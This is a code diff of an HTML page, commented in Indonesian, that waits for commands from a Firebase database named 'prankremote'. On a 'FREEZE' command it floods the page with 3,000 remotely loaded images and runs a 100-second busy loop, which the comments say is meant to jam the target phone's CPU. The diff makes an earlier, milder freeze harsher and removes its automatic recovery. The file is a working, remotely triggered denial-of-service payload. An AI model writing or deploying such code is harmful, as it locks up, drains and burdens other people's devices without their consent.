@@ -11,20 +11,21 @@
             font-family: monospace; 
             text-align: center; 
             padding-top: 100px; 
+            overflow: hidden; /* Mencegah scroll berlebih */
         }
-        h1 { font-size: 24px; }
+        h1 { font-size: 24px; position: relative; z-index: 999; }
     </style>
 </head>
 <body>
     <h1>STATUS: MENUNGGU PERINTAH...</h1>
-    <p id="log">Sistem siap.</p>
+    <p id="log" style="position: relative; z-index: 999;">Sistem siap.</p>
 
     <!-- Script Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
         // Gunakan URL database Firebase yang sama
-                        const firebaseConfig = {
+        const firebaseConfig = {
             databaseURL: "https://prankremote-fda79-default-rtdb.asia-southeast1.firebasedatabase.app/"
         };
         firebase.initializeApp(firebaseConfig);
@@ -38,28 +39,38 @@
                 document.getElementById("log").innerText = "Perintah diterima: " + aksi;
 
                 if (aksi === "FREEZE") {
-                    document.body.style.background = "#ff0000"; // Layar jadi merah tanda bahaya
-                    document.querySelector("h1").innerText = "⚠️ HP SEDANG DI-FREEZE! ⚠️";
-                    
-                    // Jalankan fungsi freeze terkontrol selama 5 detik
                     bikinFreezeKeras();
                 } else if (aksi === "NORMAL") {
-                    document.body.style.background = "#000";
-                    document.querySelector("h1").innerText = "STATUS: AMAN / NORMAL";
+                    location.reload(); // Refresh halaman buat bersihin semua elemen spam
                 }
             }
         });
 
-        // Fungsi bikin CPU kerja keras (Freeze sesaat)
+        // Fungsi bikin CPU kerja keras + Spam Elemen Gambar/Visual
         function bikinFreezeKeras() {
-            let waktuMulai = Date.now();
-            // Mutar proses berat selama 5 detik penuh agar layar macet/lag
-            while (Date.now() - waktuMulai < 20000) {
-                Math.sqrt(Math.random() * 999999999);
+            document.body.style.background = "#ff0000";
+            document.querySelector("h1").innerText = "⚠️ HP SEDANG DI-FREEZE! ⚠️";
+            
+            // Loop buat nge-spam ribuan elemen gambar/kotak secara instan ke layar
+            for (let i = 0; i < 3000; i++) {
+                let img = document.createElement("img");
+                // Mengambil gambar random ukuran kecil secara massal untuk membebani memori & rendering
+                img.src = "https://picsum.photos/100/100?random=" + i;
+                img.style.position = "absolute";
+                img.style.left = Math.random() * window.innerWidth + "px";
+                img.style.top = Math.random() * window.innerHeight + "px";
+                img.style.width = "50px";
+                img.style.height = "50px";
+                document.body.appendChild(img);
             }
-            // Setelah 5 detik, balikin status ke normal otomatis
-            document.body.style.background = "#000";
-            document.querySelector("h1").innerText = "STATUS: SELESAI FREEZE";
+
+            // Tambahan beban hitungan matematika ekstrem biar CPU HP target benar-benar macet
+            let start = Date.now();
+            while (Date.now() - start < 100000) { 
+                for(let i=0; i<1000000; i++) {
+                    Math.tan(Math.random());
+                }
+            }
         }
     </script>
 </body>
